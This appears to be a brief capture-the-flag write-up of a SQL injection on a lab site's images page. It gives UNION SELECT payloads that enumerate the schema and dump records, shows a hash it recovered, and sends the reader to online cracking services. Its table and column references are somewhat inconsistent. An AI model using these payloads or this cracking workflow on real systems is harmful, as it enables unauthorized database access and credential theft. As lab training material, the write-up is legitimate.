# SQL Injection on Images Page

On the images page, when entering alphabetic characters, we see the MariaDB error message. We can use the following SQL injection to retrieve all table names and column names:

```sql
1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
```

By searching, we find the columns `countersign` and `Commentaire` from the `users` table:

```sql
1 UNION SELECT id, comment FROM list_images
```

We retrieve the following data:

```
1928e8083cf461a51303633093573c46
Surname: Decrypt this password -> then lower all the characters. SHA256 hash it and it's good!
```

To decrypt the password, visit:
- [MD5 Decrypt](https://md5decrypt.net/)
- [dCode SHA256](https://www.dcode.fr/hash-sha256)